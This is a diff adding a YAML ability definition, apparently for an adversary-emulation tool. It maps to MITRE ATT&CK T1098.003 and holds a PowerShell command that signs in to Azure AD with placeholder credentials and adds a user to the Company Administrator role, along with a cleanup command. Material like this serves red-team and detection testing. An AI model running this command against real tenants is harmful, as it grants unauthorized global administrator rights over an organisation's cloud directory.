@@ -1,0 +1,24 @@
+---
+- id: 64c11bc729e5b99c282d4abd4d51b3fc
+  name: Azure AD - Add Company Administrator Role to a user
+  description: 'Add an existing Azure user account the Company Administrator Role.
+
+    '
+  tactic: multiple
+  technique:
+    attack_id: T1098.003
+    name: 'Account Manipulation: Additional Cloud Roles'
+  platforms:
+    unknown:
+      psh:
+        command: Import-Module MSOnline; $Password = ConvertTo-SecureString -String
+          "p4sswd" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential
+          -ArgumentList "jonh@contoso.com", $Password; Connect-MsolService -Credential
+          $Credential; Add-MsolRoleMember -RoleName "Company Administrator" -RoleMemberEmailAddress
+          "default"
+        payloads: []
+        cleanup: Remove-MsolRoleMember -RoleName "Company Administrator" -RoleMemberType
+          User -RoleMemberEmailAddress "default"
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
